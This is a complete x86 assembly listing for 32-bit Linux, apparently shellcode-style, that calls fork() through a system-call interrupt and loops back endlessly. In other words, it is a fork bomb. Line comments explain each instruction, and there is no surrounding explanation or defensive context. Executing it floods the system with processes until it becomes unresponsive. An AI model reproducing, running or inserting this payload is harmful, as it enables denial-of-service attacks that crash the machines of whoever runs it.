section .text
    global _start

_start:
    push byte 1 ; push 0x1
    pop ebx     ; pop ebx 
    mov eax, ebx ; eax now contains 0x1
    inc eax      ; inc eax , eax is now 2 
    int 0x80     ; call fork()
    jmp short _start ; endless loop 
